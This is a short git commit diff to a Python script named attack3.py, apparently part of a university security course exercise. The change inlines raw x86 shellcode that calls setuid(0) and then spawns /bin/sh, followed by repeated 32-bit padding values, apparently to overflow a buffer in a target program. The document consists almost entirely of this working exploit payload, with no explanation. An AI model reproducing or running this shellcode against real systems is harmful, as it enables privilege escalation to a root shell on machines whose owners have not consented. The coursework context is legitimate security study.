2d6dee82a72053df4da67474ccfe809b08913302
Alexander Yang <ayang015@seas.upenn.edu>
2020-09-25 13:17:44 -0400

    fixed shellcode

--- attack3.py
+++ attack3.py
@@ -1,10 +1,10 @@
 import sys
-from shellcode3 import shellcode
-from shellcode2 import setuid
 from struct import pack
 # sys.stdout.buffer.write(b"asdfasdfasd")
 # sys.stdout.buffer.write(setuid)
-sys.stdout.buffer.write(shellcode)
+# sys.stdout.buffer.write(shellcode)
+
+sys.stdout.buffer.write(b"\x31\xdb\x31\xc0\xb0\x17\xcd\x80\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80")
 
 for i in range(0, 88):
 	sys.stdout.buffer.write(pack("<I", 0x11))
